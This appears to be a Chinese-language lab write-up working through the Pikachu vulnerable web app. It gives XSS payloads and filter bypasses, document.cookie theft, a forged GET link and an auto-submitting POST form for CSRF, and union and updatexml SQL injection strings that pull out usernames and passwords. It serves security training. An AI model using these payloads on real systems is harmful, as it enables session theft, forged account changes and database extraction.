+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p>管理员登录后台，被xss攻击。后台弹窗</p>
+<p><a href="https://imgchr.com/i/snDbcR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDbcR.png" srcset="/img/loading.gif" alt="snDbcR.png"></a></p>
+<p>后台弹cookie。</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snDOnx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDOnx.png" srcset="/img/loading.gif" alt="snDOnx.png"></a></p>
+<p>攻击者获取cookie。</p>
+<p><a href="https://imgchr.com/i/snDXB6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDXB6.png" srcset="/img/loading.gif" alt="snDXB6.png"></a></p>
+<p>成功返回cookie</p>
+<p><a href="https://imgchr.com/i/snDzND" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDzND.png" srcset="/img/loading.gif" alt="snDzND.png"></a></p>
+<h4 id="xss过滤-绕过"><a href="#xss过滤-绕过" class="headerlink" title="xss过滤-绕过"></a>xss过滤-绕过</h4><p>转换绕过</p>
+<blockquote>
+<p><strong>前端限制绕过</strong>,直接抓包重放,或者修改html前端代码<br><strong>大小写</strong>,比如: <code>&lt;SCRIPT&gt; aLeRT(111)&lt;/sCRIpt&gt;</code><br><strong>拼凑</strong>: <code>&lt;scri&lt;script&gt;pt&gt; alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code><br><strong>使用注释进行干扰</strong>: <code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc &lt;!--test--&gt;ript&gt;</code></p>
+</blockquote>
+<p>编码绕过</p>
+<blockquote>
+<p>核心思路:<br>后台过滤了特殊字符，比如&lt;script&gt;标签,但该标签可以被各种编码，后台不一定会过滤。<br>当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行。</p>
+<p><strong>注意编码在输出点是否会被正常识别和翻译。</strong></p>
+</blockquote>
+<p>html实体编码</p>
+<p><strong>XSS绕过的姿势有很多取决于你的思路和对前端技术的掌握程度</strong></p>
+<hr>
+<p>大小写绕过</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScrIpt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">SCRipt</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snDjHK" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDjHK.png" srcset="/img/loading.gif" alt="snDjHK.png"></a></p>
+<p><strong>img标签绕过</strong></p>
+<pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">"alert(1)"</span>/&gt;
+&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(/xss/)&gt;</code></pre>
+
+<p><a href="https://imgchr.com/i/s3T1N6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3T1N6.png" srcset="/img/loading.gif" alt="s3T1N6.png"></a></p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(/xss/)</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/s3TlAx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3TlAx.png" srcset="/img/loading.gif" alt="s3TlAx.png"></a></p>
+<h4 id="xss之html-special-chars"><a href="#xss之html-special-chars" class="headerlink" title="xss之html special chars"></a>xss之html special chars</h4><pre><code class="hljs angelscript">javascript:prompt(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snDxAO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDxAO.png" srcset="/img/loading.gif" alt="snDxAO.png"></a></p>
+<p>获取cookie</p>
+<p><a href="https://imgchr.com/i/snrS4e" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snrS4e.png" srcset="/img/loading.gif" alt="snrS4e.png"></a></p>
+<h4 id="xss之herf输出"><a href="#xss之herf输出" class="headerlink" title="xss之herf输出"></a>xss之herf输出</h4><p>先随便输入几个字符测试一下</p>
+<p><a href="https://imgchr.com/i/snr99H" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snr99H.png" srcset="/img/loading.gif" alt="snr99H.png"></a></p>
+<p>点击跳转到<a href="http://192.168.2.137:8000/vul/xss/xxx" target="_blank" rel="noopener">http://192.168.2.137:8000/vul/xss/xxx</a></p>
+<p><a href="https://imgchr.com/i/snrC3d" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snrC3d.png" srcset="/img/loading.gif" alt="snrC3d.png"></a></p>
+<p>更换为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><a href="https://imgchr.com/i/snrPgA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snrPgA.png" srcset="/img/loading.gif" alt="snrPgA.png"></a></p>
+<pre><code class="hljs angelscript">javascript:prompt(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snrijI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snrijI.png" srcset="/img/loading.gif" alt="snrijI.png"></a></p>
+<p>获取cookie</p>
+<p><a href="https://imgchr.com/i/s37JI0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s37JI0.png" srcset="/img/loading.gif" alt="s37JI0.png"></a></p>
+<h4 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h4><pre><code class="hljs 1c">'-prompt(1)-'</code></pre>
+
+<p><a href="https://imgchr.com/i/s37URU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s37URU.png" srcset="/img/loading.gif" alt="s37URU.png"></a></p>
+<p>获取cookie</p>
+<pre><code class="hljs 1c">'-prompt(document.cookie)-'</code></pre>
+
+<p><a href="https://imgchr.com/i/s37sd1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s37sd1.png" srcset="/img/loading.gif" alt="s37sd1.png"></a></p>
+<h3 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h3><p><strong>CSRF(跨站请求伪造)概述</strong><br>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆，更有甚者会将其和越权问题混为一谈，这都是对原理没搞清楚导致的。</p>
+<p><strong>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</strong> </p>
+<p>网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>    –对敏感信息的操作增加安全的token；<br>    –对敏感信息的操作增加安全的验证码；<br>    –对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
+<h4 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF-get"></a>CSRF-get</h4><p>使用vince账号登录，抓包获取修改个人资料的请求包</p>
+<p><a href="https://imgchr.com/i/s37RzD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s37RzD.png" srcset="/img/loading.gif" alt="s37RzD.png"></a></p>
+<p>获取修改个人资料的链接，构造修改资料链接。攻击者伪造链接：</p>
+<pre><code class="hljs sas">http://192.168.2.137:8000/vul/csrf/csrfget/csrf_get_edit.php?sex=boy<span class="hljs-variable">&amp;phonenum</span>=13344445555<span class="hljs-variable">&amp;add</span>=123<span class="hljs-variable">&amp;email</span>=afdas%40qq.com<span class="hljs-variable">&amp;submit</span>=submit</code></pre>
+
+<p>受害者allen已登录的情况下点击链接</p>
+<p><a href="https://imgchr.com/i/s374Ld" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s374Ld.png" srcset="/img/loading.gif" alt="s374Ld.png"></a></p>
+<p>当受害者allen访问攻击者构造的修改资料链接后，资料会被修改。</p>
+<p><a href="https://imgchr.com/i/snDdnP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDdnP.png" srcset="/img/loading.gif" alt="snDdnP.png"></a></p>
+<h4 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF-post"></a>CSRF-post</h4><p>POST型的，并没有显示在URL当中，所有参数在form表单的请求体中提交，我们不能通过伪造URL的方式进行攻击。</p>
+<p>修改资料，抓包</p>
+<p><a href="https://imgchr.com/i/snD078" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snD078.png" srcset="/img/loading.gif" alt="snD078.png"></a></p>
+<blockquote>
+<p>post型CSRF利用需要伪造一个站点（在站点上做个表单），构造恶意的url，通过这个url去向存在CSRF漏洞的页面提交post。</p>
+</blockquote>
+<p>当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。 我们在这里直接使用别人写的script,自己搭一个页面，诱导用户点进来，劫持用户发送修改信息的请求。</p>
+<p>编写csrf_post.html页面</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+<span class="javascript"><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span>
+<span class="javascript">  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"postsubmit"</span>).click();</span>
+&#125;
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://192.168.2.137:8000/vul/csrf/csrfpost/csrf_post_edit.php"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"boy"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"phonenum"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"phonenum"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"18626545453"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"add"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"add"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"ZhangJiaKou"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"vince@pikachu.com"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"postsubmit"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"submit"</span> /&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+
+<p>把该文件移动到docker中。</p>
+<pre><code class="hljs elixir">sudo docker cp csrf_post.html 07<span class="hljs-symbol">:/var/www/html/vul/csrf/</span>    将文件复制到docker中
+
+<span class="hljs-symbol">docker:</span>
+root<span class="hljs-variable">@07d75d16ede6</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ls /var/www/html/vul/csrf/</span>
+csrfget  csrf.php  csrfpost  csrftoken
+root<span class="hljs-variable">@07d75d16ede6</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ls /var/www/html/vul/csrf/</span>
+csrfget  csrf.php  csrfpost  csrf_post.html  csrftoken</code></pre>
+
+<p>诱使受害者allen点击链接：</p>
+<p><a href="https://imgchr.com/i/snDN6I" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDN6I.png" srcset="/img/loading.gif" alt="snDN6I.png"></a></p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vul/</span>csrf<span class="hljs-regexp">/csrf_post.html</span></code></pre>
+
+<p>受害者点击该链接后，信息被修改。</p>
+<p><a href="https://imgchr.com/i/snDUXt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDUXt.png" srcset="/img/loading.gif" alt="snDUXt.png"></a></p>
+<h4 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF-token"></a>CSRF-token</h4><p>抓包可以发现代码提交的信息里面加入了token，CSRF的主要问题是敏感操作容易被伪造，加入token让请求不容易被伪造，每次请求，都增加一个随机码（要足够随机，不容易被伪造），后台每次对这个随机码进行验证。token是可以有效防止CSRF的，但是记住我们之前做的暴力破解，token防不住的。</p>
+<p><a href="https://imgchr.com/i/snDw0f" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDw0f.png" srcset="/img/loading.gif" alt="snDw0f.png"></a></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><pre><code class="hljs pgsql"><span class="hljs-keyword">SQL</span>注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到<span class="hljs-keyword">SQL</span>语句中后，被当作<span class="hljs-keyword">SQL</span>语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
+在构建代码时，一般会从如下几个方面的策略来防止<span class="hljs-keyword">SQL</span>注入漏洞：
+<span class="hljs-number">1.</span>对传进<span class="hljs-keyword">SQL</span>语句里面的变量进行过滤，不允许危险字符传入；
+<span class="hljs-number">2.</span>使用参数化（Parameterized Query 或 Parameterized <span class="hljs-keyword">Statement</span>）；
+<span class="hljs-number">3.</span>还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!</code></pre>
+
+<h4 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入-post"></a>数字型注入-post</h4><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-number">1</span>;</code></pre>
+
+<p>因为是post方式所以URL里不显示，我们需要通过burpsuite抓包修改post data来实现注入</p>
+<p><a href="https://imgchr.com/i/snDshQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDshQ.png" srcset="/img/loading.gif" alt="snDshQ.png"></a></p>
+<p>order by判断列数</p>
+<p><a href="https://imgchr.com/i/s3CU61" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CU61.png" srcset="/img/loading.gif" alt="s3CU61.png"></a></p>
+<p>union select联合查询</p>
+<p><a href="https://imgchr.com/i/s3CaOx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CaOx.png" srcset="/img/loading.gif" alt="s3CaOx.png"></a></p>
+<p><a href="https://imgchr.com/i/s3Cwm6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3Cwm6.png" srcset="/img/loading.gif" alt="s3Cwm6.png"></a></p>
+<pre><code class="hljs basic"><span class="hljs-symbol">2 </span>union select concat(table_name),user() from information_schema.tables where table_schema=<span class="hljs-comment">'pikachu'</span></code></pre>
+
+<p>获取表名</p>
+<p><a href="https://imgchr.com/i/s3C00K" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3C00K.png" srcset="/img/loading.gif" alt="s3C00K.png"></a></p>
+<p>获取列名</p>
+<pre><code class="hljs basic"><span class="hljs-symbol">2 </span>union select concat(column_name),user() from information_schema.columns where table_name=<span class="hljs-comment">'users'</span></code></pre>
+
+<p><a href="https://imgchr.com/i/s3CBTO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CBTO.png" srcset="/img/loading.gif" alt="s3CBTO.png"></a></p>
+<p>获取数据</p>
+<pre><code class="hljs crystal"><span class="hljs-number">2</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">concat</span>(<span class="hljs-title">username</span>,0<span class="hljs-title">x7e</span>,<span class="hljs-title">password</span>),<span class="hljs-title">user</span>() <span class="hljs-title">from</span> <span class="hljs-title">users</span></span></code></pre>
+
+<p><a href="https://imgchr.com/i/s3Cste" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3Cste.png" srcset="/img/loading.gif" alt="s3Cste.png"></a></p>
+<h4 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入-get"></a>字符型注入-get</h4><p>GET请求是显示在URL里的，这里从URL注入就可以。尝试单引号双引号测试。</p>
+<p><code>http://192.168.2.137:8000/vul/sqli/sqli_str.php?name=lili%27or+1%3D1+--+&amp;submit=%E6%9F%A5%E8%AF%A2</code></p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'字符串'</span>;
+' order by 2<span class="hljs-comment">-- 判断列数</span>
+' union <span class="hljs-keyword">select</span> <span class="hljs-keyword">concat</span>(table_name),<span class="hljs-keyword">database</span>() <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'pikachu'</span><span class="hljs-comment">-- 获取表名，截图略</span>
+<span class="hljs-string">' union select concat(column_name),database() from information_schema.columns where table_name='</span><span class="hljs-keyword">users</span><span class="hljs-string">'-- 获取列名</span>
+<span class="hljs-string">'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">concat</span>(username,<span class="hljs-keyword">password</span>),<span class="hljs-keyword">database</span>() <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-comment">-- 获取数据</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snDDAS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDDAS.png" srcset="/img/loading.gif" alt="snDDAS.png"></a></p>
+<pre><code class="hljs sql">lili or 1=1被当作字符串处理
+<span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'lili or 1=1'</span>;
+如何绕过呢？lili'or 1=1 <span class="hljs-comment">-- 闭合前面的单引号，注释后面的单引号。</span>
+<span class="hljs-keyword">select</span> 字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'lili'</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-comment">-- ';</span></code></pre>
+
+<p><a href="https://imgchr.com/i/snDrtg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDrtg.png" srcset="/img/loading.gif" alt="snDrtg.png"></a></p>
+<h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>猜测后台sql语句。构造闭合语句。</p>
+<p>查看后台源码</p>
+<pre><code class="hljs bash"><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'submit'</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>]!=null)&#123;
+
+    //这里没有做任何处理，直接拼到select里面去了
+    <span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
+
+    //这里的变量是模糊匹配，需要考虑闭合
+    <span class="hljs-variable">$query</span>=<span class="hljs-string">"select username,id,email from member where username like '%<span class="hljs-variable">$name</span>%'"</span>;
+    <span class="hljs-variable">$result</span>=execute(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$query</span>);
+    <span class="hljs-keyword">if</span>(mysqli_num_rows(<span class="hljs-variable">$result</span>)&gt;=1)&#123;
+        //彩蛋:这里还有个xss
+        <span class="hljs-variable">$html2</span>.=<span class="hljs-string">"&lt;p class='notice'&gt;用户名中含有&#123;<span class="hljs-variable">$_GET</span>['name']&#125;的结果如下：&lt;br /&gt;"</span>;
+        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span>=mysqli_fetch_assoc(<span class="hljs-variable">$result</span>))&#123;
+            <span class="hljs-variable">$uname</span>=<span class="hljs-variable">$data</span>[<span class="hljs-string">'username'</span>];
+            <span class="hljs-variable">$id</span>=<span class="hljs-variable">$data</span>[<span class="hljs-string">'id'</span>];
+            <span class="hljs-variable">$email</span>=<span class="hljs-variable">$data</span>[<span class="hljs-string">'email'</span>];
+            <span class="hljs-variable">$html1</span>.=<span class="hljs-string">"&lt;p class='notice'&gt;username：&#123;<span class="hljs-variable">$uname</span>&#125;&lt;br /&gt;uid:&#123;<span class="hljs-variable">$id</span>&#125; &lt;br /&gt;email is: &#123;<span class="hljs-variable">$email</span>&#125;&lt;/p&gt;"</span>;
+        &#125;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+
+        <span class="hljs-variable">$html1</span>.=<span class="hljs-string">"&lt;p class='notice'&gt;0o。..没有搜索到你输入的信息！&lt;/p&gt;"</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>构造闭合语句</p>
+<pre><code class="hljs lsl">$query=<span class="hljs-string">"select username,id,email from member where username like '%$name%'"</span>;
+'%$name%'
+'% lili%'or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>-- %'
+在搜索框输入 lili%'or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>-- 
+
+联合查询总是报错
+尝试更换函数注入
+select username,id,<span class="hljs-section">email</span> from member where username like '%lili%' or updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,user() ),<span class="hljs-number">0</span>);
+
+user()替换为(select table_name from information_schema.tables where table_schema='pikachu' limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)
+
+select username,id,<span class="hljs-section">email</span> from member where username like '%lili%' and updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select table_name from information_schema.tables where table_schema='pikachu' limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>)#; 获取表名
+
+select username,id,<span class="hljs-section">email</span> from member where username like '%lili%' and updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select column_name from information_schema.columns where table_name='users' limit <span class="hljs-number">4</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>)#; 获取列名
+
+select username,id,<span class="hljs-section">email</span> from member where username like '%lili%' and updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select username from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>)#;</code></pre>
+
+<p><a href="https://imgchr.com/i/snD6pj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snD6pj.png" srcset="/img/loading.gif" alt="snD6pj.png"></a></p>
+<h4 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h4><p>同样的查看源码，想办法闭合语句</p>
+<pre><code class="hljs perl"><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">'submit'</span>]) &amp;&amp; $_GET[<span class="hljs-string">'name'</span>]!=null)&#123;
+    //这里没有做任何处理，直接拼到<span class="hljs-keyword">select</span>里面去了
+    $name=$_GET[<span class="hljs-string">'name'</span>];
+    //这里的变量是字符型，需要考虑闭合
+    $query=<span class="hljs-string">"select id,email from member where username=('$name')"</span>;
+    $result=execute($link, $query);
+    <span class="hljs-keyword">if</span>(mysqli_num_rows($result)&gt;=<span class="hljs-number">1</span>)&#123;
+        <span class="hljs-keyword">while</span>($data=mysqli_fetch_assoc($result))&#123;
+            $id=$data[<span class="hljs-string">'id'</span>];
+            $email=$data[<span class="hljs-string">'email'</span>];
+            $html.=<span class="hljs-string">"&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"</span>;
+        &#125;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+
+        $html.=<span class="hljs-string">"&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>构造闭合语句</p>
+<pre><code class="hljs lsl">$query=<span class="hljs-string">"select id,email from member where username=('$name')"</span>;
+username=('$name')
+username=(' <span class="hljs-number">1</span>')or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>-- ')
+在搜索框输入 <span class="hljs-number">1</span>')or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>-- 
+<span class="hljs-number">1</span>')or updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,user() ),<span class="hljs-number">0</span>)-- 
+<span class="hljs-number">1</span>')or updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select table_name from information_schema.tables where table_schema='pikachu' limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>)-- 获取表名
+<span class="hljs-number">1</span>')or updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select column_name from information_schema.columns where table_name='users' limit <span class="hljs-number">4</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>)-- 获取列名
+<span class="hljs-number">1</span>')or updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select username from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>)--</code></pre>
+
+<p><a href="https://imgchr.com/i/snDc1s" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/08/snDc1s.png" srcset="/img/loading.gif" alt="snDc1s.png"></a></p>
+<blockquote>
+<p>mysql服务器支持3种注释</p>
+<p>从#字符至行尾</p>
+<p>从– 字符至行尾。–后至少跟一个空格</p>
+<p>从<code>/*</code>至<code>*/</code>，允许多行注释</p>
+<p>Get方式中使用URL提交注入数据;</p>
+<p>Post方式中使用抓包工具修改post数据部分提交注入; </p>
+</blockquote>
+<h4 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h4><pre><code class="hljs stylus">基于报错获取信息的函数
+
+<span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">()</span></span>
+语法UPDATEXML (xml_document, XPath_string, new_value)    xpath定位必须有效
+<span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">(<span class="hljs-number">1</span>,database()</span></span>,<span class="hljs-number">0</span>)
+<span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0</span>x7e,database()</span></span> ),<span class="hljs-number">0</span>)
+使用or闭合语句
+
+<span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">()</span></span>
+语法ExtractValue(xml_document, xpath_string)   xpath定位必须有效
+<span class="hljs-function"><span class="hljs-title">ExtractValue</span><span class="hljs-params">(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0</span>x7e,database()</span></span> ))</code></pre>
+
